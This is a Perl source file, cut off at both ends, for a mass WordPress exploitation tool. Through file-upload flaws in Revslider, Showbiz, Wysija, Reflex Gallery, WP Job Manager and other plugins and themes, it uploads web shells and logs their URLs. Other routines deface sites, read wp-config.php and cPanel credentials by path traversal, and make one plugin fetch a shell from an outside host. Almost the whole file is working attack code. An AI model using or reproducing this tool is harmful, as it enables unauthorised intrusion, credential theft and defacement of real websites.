print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revultimatum =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revcentum =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revbeachapollo =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revcuckootap =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revpindol =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revdesignplus =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revrarebird =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

elsif($revandre =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
open (TEXT, '>>Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/priv.php?c=izo\n";
close (TEXT);
threads->exit();
}

else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Upload Shell";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Pwned by<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /Pwned/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $revsliderajax\n";
open (TEXT, '>>index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

sub getconfig(){
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
     open(save, '>>Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

sub getcpconfig(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["tool/priv.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/priv.php?c=izo';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /izocin/){
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $showbizup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$showbizup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["tool/priv.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/priv.php?c=izo";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $adsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["tool/priv.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/priv.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/priv.php?c=izo";

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $sspup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "http://flickr.com.ehpet.net/uploader.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/upz.php";


my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/ZeroByte/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['tool/izo.zip', => 'tool/izo.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/izo/priv.php?c=izo";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wysijaup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wysijaup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/priv.php?c=izo";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["tool/priv.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/priv.php?c=izo";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["tool/priv.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $dzsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $reflexup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ Creative Contact Form #####################
sub sexycontactformz(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/priv.php?c=izo";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["tool/priv.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ Realestate tema shell upload #####################
sub realestate(){ 
my $url = "$site/wp-content/themes/Realestate/Monetize/general/upload-file.php";
$realestateup = "$site/wp-content/themes/Realestate/images/tmp/priv.php?c=izo";
my $field_name = "uploadfile[]";

my $realestateres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["tool/priv.php"] ]
           
            );

$checkrealestateup = $ua->get("$realestateup")->content;
if($checkrealestateup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Realestate Tema Uplod";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $realestateup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$realestateup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Realestate Tema Uplod";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="tool/priv.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/priv.php?c=izo";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wtffup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

sub brainstorm(){

my $url = "$site/wp-content/themes/brainstorm/functions/jwpanel/scripts/uploadify/uploadify.php";
my $shell ="tool/priv.php";
my $field_name = "Filedata";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);

$fuildupz="$site/wp-content/uploads/$year/$month/priv.php?c=izo";

my $checkblocktestimonial = $ua->get("$fuildupz")->content;
if($checkblocktestimonial =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"brainstorm";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $fuildupz\n";
open (TEXT, '>>Shells.txt');
print TEXT "$fuildupz\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"brainstorm";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="tool/priv.php";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/priv.php?c=izo";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jobmangerup\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
open (TEXT, '>>index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ WP Job Manger #####################
sub wpjmtt(){
my $url = "$site//wp-content/uploads/job-manager-uploads/file/";

my $shell ="priv.php";
my $field_name = "files[]";

my $field_name =  "files[]";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);


$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/priv.php?c=izo";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jobmangerup\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
open (TEXT, '>>index.txt');
print TEXT "$jobmangerup\n";
